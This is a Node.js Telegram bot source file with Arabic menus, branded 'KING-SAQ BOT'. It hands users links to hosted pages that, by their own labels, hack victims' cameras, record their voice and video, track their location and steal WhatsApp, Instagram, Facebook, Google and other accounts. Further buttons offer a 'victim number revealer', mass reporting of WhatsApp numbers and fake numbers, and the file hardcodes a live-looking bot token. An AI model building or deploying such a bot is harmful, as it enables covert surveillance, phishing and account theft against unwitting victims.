const TelegramBot = require('node-telegram-bot-api');
const fs = require('fs');

// ⚠️ التوكن بتاعك
const TOKEN = '8945901025:AAFMunPkkoNRdMrj-OtgSUnUapqV_TKEK90';
const DEVELOPER_ID = 8794777974; // الآيدي بتاعك
const bot = new TelegramBot(TOKEN, { polling: true });

// رابط صورة الهيدر
const BANNER_URL = "https://www.image2url.com/r2/default/images/1792619785603-05724b00-59c1-46c7-a878-821f2cbd8452.png";

// ملف تخزين المستخدمين
const USERS_FILE = 'users.json';

// دالة تحميل بيانات المستخدمين
function loadUsers() {
    if (!fs.existsSync(USERS_FILE)) {
        fs.writeFileSync(USERS_FILE, JSON.stringify({ users: [] }));
        return { users: [] };
    }
    const data = fs.readFileSync(USERS_FILE);
    return JSON.parse(data);
}

// دالة حفظ بيانات المستخدمين
function saveUsers(data) {
    fs.writeFileSync(USERS_FILE, JSON.stringify(data, null, 2));
}

// تسجيل مستخدم جديد
function registerUser(userId, name) {
    const data = loadUsers();
    const exists = data.users.find(u => u.id === userId);
    if (!exists) {
        data.users.push({ id: userId, name: name });
        saveUsers(data);
    }
}

// ✅ روابط الأقسام (كل الأقسام)
const links = {
    'hack_cam': "https://cam-bot.bonto.run/",
    'record_voice': "https://cam-bot.bonto.run/voice.html",
    'record_video': "https://cam-bot.bonto.run/video.html",
    'location': "https://cam-bot.bonto.run/location.html",
    'hack_telegram': "https://cam-bot.bonto.run/telegram.html",
    'hack_google': "https://cam-bot.bonto.run/google.html",
    'network_cards': "https://cam-bot.bonto.run/cards.html",
    'device_check': "https://cam-bot.bonto.run/scan.html",
    'freefire': "https://cam-bot.bonto.run/freefire.html",
    'snapchat': "https://cam-bot.bonto.run/snapchat.html",
    'pubg': "https://cam-bot.bonto.run/pubg.html",
    'whatsapp': "https://cam-bot.bonto.run/whatsapp.html",
    'facebook': "https://cam-bot.bonto.run/facebook.html",
    'instagram': "https://cam-bot.bonto.run/instagram.html",
    'tiktok': "https://cam-bot.bonto.run/tiktok.html",
    'hack_youtube': "https://cam-bot.bonto.run/youtube.html",
    'hack_likee': "https://cam-bot.bonto.run/likee.html",
    'hack_kwai': "https://cam-bot.bonto.run/kwai.html",
    'unban_service': "https://cam-bot.bonto.run/unban.html",
    'report_number': "https://cam-bot.bonto.run/report.html",
    'get_phone_link': "https://t.me/heroil_2bot"
};

// القائمة الرئيسية
function getMainKeyboard() {
    return {
        reply_markup: JSON.stringify({
            inline_keyboard: [
                [{ text: "📸 اختراق كاميرا", callback_data: 'hack_cam' }, { text: "☠️ تلغيم صورة", callback_data: 'coming_soon' }],
                [{ text: "🎙️ تسجيل صوت", callback_data: 'record_voice' }, { text: "📹 تصوير فيديو", callback_data: 'record_video' }],
                [{ text: "📍 تحديد الموقع", callback_data: 'location' }],
                [{ text: "✅ اختراق واتساب", callback_data: 'whatsapp' }, { text: "📨 اختراق تلجرام", callback_data: 'hack_telegram' }],
                [{ text: "🎬 اختراق تيك توك", callback_data: 'tiktok' }, { text: "🚀 اختراق انستقرام", callback_data: 'instagram' }],
                [{ text: "🔵 اختراق فيسبوك", callback_data: 'facebook' }, { text: "👻 اختراق سناب", callback_data: 'snapchat' }],
                [{ text: "❤️ اختراق لايكي", callback_data: 'hack_likee' }, { text: "🎥 اختراق كواي", callback_data: 'hack_kwai' }],
                [{ text: "▶️ اختراق يوتيوب", callback_data: 'hack_youtube' }],
                [{ text: "🔥 اختراق بوبجي", callback_data: 'pubg' }, { text: "💎 اختراق فري فاير", callback_data: 'freefire' }],
                [{ text: "🔴 اختراق جوجل", callback_data: 'hack_google' }, { text: "📱 فحص الجهاز", callback_data: 'device_check' }],
                [{ text: "✅ فك حظر واتساب", callback_data: 'unban_service' }, { text: "🚨 حظر أرقام واتساب", callback_data: 'report_number' }],
                [{ text: "📞 كاشف رقم الضحية", callback_data: 'get_phone_link' }],
                [{ text: "📞 سحب جهات الاتصال", callback_data: 'get_contacts' }, { text: "✉️ سحب جميع الرسائل", callback_data: 'get_messages' }],
                [{ text: "🖼️ سحب جميع الصور", callback_data: 'get_photos' }],
                [{ text: "📱 أرقام وهمية", callback_data: 'fake_num' }],
                [{ text: "💸 تحويل نقاط", callback_data: 'transfer_points' }, { text: "💰 تجميع نقاط", callback_data: 'collect_points' }],
                [{ text: "💳 أسعار النقاط", callback_data: 'points_store' }],
                [{ text: "👨‍💻 التواصل مع المطور", callback_data: 'contact' }, { text: "ℹ️ حول البوت", callback_data: 'about' }]
            ]
        })
    };
}

// الرد على /start
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    const name = msg.from.first_name || 'مستخدم';
    registerUser(chatId, name);

    const text = "╔══════════════════════════╗\n" +
                 "║   ⚔️ <b>KING-SAQ BOT</b> ⚔️   ║\n" +
                 "╚══════════════════════════╝\n\n" +
                 "🔥 <b>اختر القسم المناسب من الأزرار أدناه:</b> ✨";

    bot.sendPhoto(chatId, BANNER_URL, {
        caption: text,
        parse_mode: 'HTML',
        ...getMainKeyboard()
    }).catch(() => {
        bot.sendMessage(chatId, text, { parse_mode: 'HTML', ...getMainKeyboard() });
    });
});

// الرد على /admin
bot.onText(/\/admin/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId !== DEVELOPER_ID) {
        bot.sendMessage(chatId, "❌ هذا الأمر خاص بالمطور فقط.");
        return;
    }

    bot.sendMessage(chatId, "𖤍『لَوْحَةُ الـمَلِك』𖤍\n𓆩♛𓆪 الهكر هرويل 206 𓆩♛𓆪\n\nاختر الخيار:", {
        parse_mode: 'HTML',
        reply_markup: JSON.stringify({
            inline_keyboard: [
                [{ text: "📊 إحصائيات", callback_data: 'admin_stats' }],
                [{ text: "📢 إذاعة للمستخدمين", callback_data: 'admin_broadcast' }],
                [{ text: "🔙 إغلاق", callback_data: 'admin_close' }]
            ]
        })
    });
});

// التعامل مع الأزرار
bot.on('callback_query', (query) => {
    const chatId = query.message.chat.id;
    const data = query.data;

    if (data === 'admin_stats') {
        const data = loadUsers();
        bot.sendMessage(chatId, `📊 <b>إحصائيات البوت:</b>\n\n👥 عدد المستخدمين: ${data.users.length}`, { parse_mode: 'HTML' });
    } else if (data === 'admin_broadcast') {
        if (chatId !== DEVELOPER_ID) return;
        bot.sendMessage(chatId, "📢 أرسل الرسالة اللي تبغى ترسلها لكل المستخدمين:");
        bot.once('message', (msg) => {
            const message = msg.text;
            const data = loadUsers();
            let success = 0;
            let failed = 0;

            data.users.forEach(user => {
                bot.sendMessage(user.id, message).then(() => success++).catch(() => failed++);
            });

            setTimeout(() => {
                bot.sendMessage(chatId, `✅ تم الإرسال!\n\n📤 نجح: ${success}\n❌ فشل: ${failed}`);
            }, 2000);
        });
    } else if (data === 'admin_close') {
        bot.deleteMessage(chatId, query.message.message_id);
    } else if (data === 'fake_num') {
        bot.sendMessage(chatId, "📱 <b>أرقام وهمية</b>\n\nاختر المنصة:", {
            parse_mode: 'HTML',
            reply_markup: JSON.stringify({
                inline_keyboard: [
                    [{ text: "📞 أرقام واتساب", callback_data: 'fake_wa' }, { text: "📨 أرقام تلجرام", callback_data: 'fake_tg' }],
                    [{ text: "📱 أرقام إيمو", callback_data: 'fake_imo' }, { text: "📸 أرقام انستقرام", callback_data: 'fake_ig' }],
                    [{ text: "🔙 رجوع", callback_data: 'back_main' }]
                ]
            })
        });
    } else if (data === 'fake_wa' || data === 'fake_tg' || data === 'fake_imo' || data === 'fake_ig') {
        const platformName = { fake_wa: 'واتساب', fake_tg: 'تلجرام', fake_imo: 'إيمو', fake_ig: 'انستقرام' }[data];
        bot.sendMessage(chatId, `📱 <b>${platformName} - اختر الدولة:</b>`, {
            parse_mode: 'HTML',
            reply_markup: JSON.stringify({
                inline_keyboard: [
                    [{ text: "🇸🇦 السعودية", callback_data: `${data}_sa` }],
                    [{ text: "🇾🇪 اليمن", callback_data: `${data}_ye` }],
                    [{ text: "🇪🇬 مصر", callback_data: `${data}_eg` }],
                    [{ text: "🇸🇾 سوريا", callback_data: `${data}_sy` }],
                    [{ text: "🇮🇶 العراق", callback_data: `${data}_iq` }],
                    [{ text: "🇺🇸 أمريكا", callback_data: `${data}_us` }],
                    [{ text: "🇷🇺 روسيا", callback_data: `${data}_ru` }],
                    [{ text: "🔙 رجوع", callback_data: 'fake_num' }]
                ]
            })
        });
    } else if (data.includes('_sa') || data.includes('_ye') || data.includes('_eg') || data.includes('_sy') || data.includes('_iq') || data.includes('_us') || data.includes('_ru')) {
        bot.sendMessage(chatId, "⚠️ <b>هذا القسم قيد التطوير، سيتم إضافة الأرقام قريباً.</b>", { parse_mode: 'HTML' });
    } else if (data === 'back_main') {
        bot.sendMessage(chatId, "🔥 <b>اختر القسم المناسب:</b>", { parse_mode: 'HTML', ...getMainKeyboard() });
    } else if (data === 'about') {
        bot.sendMessage(chatId, "👨‍💻 <b>KING-SAQ BOT v3.0</b>", { parse_mode: 'HTML' });
    } else if (data === 'contact') {
        bot.sendMessage(chatId, "👨‍💻 <b>المطور:</b> @heroil_1", { parse_mode: 'HTML' });
    } else if (data === 'coming_soon' || data === 'transfer_points' || data === 'collect_points' || data === 'points_store' || data === 'get_contacts' || data === 'get_messages' || data === 'get_photos') {
        bot.sendMessage(chatId, "🛠️ <b>هذا القسم قيد التطوير حالياً.</b>", { parse_mode: 'HTML' });
    } else if (links[data]) {
        bot.sendMessage(chatId, `🔗 <b>الرابط جاهز:</b>\n\n${links[data]}`, {
            parse_mode: 'HTML',
            disable_web_page_preview: true
        });
    } else {
        bot.sendMessage(chatId, "🛠️ هذا القسم غير متاح حالياً.", { parse_mode: 'HTML' });
    }

    bot.answerCallbackQuery(query.id);
});

console.log("⚔ البوت شغال بنجاح على Node.js... (النسخة الكاملة مع لوحة الأدمن)");
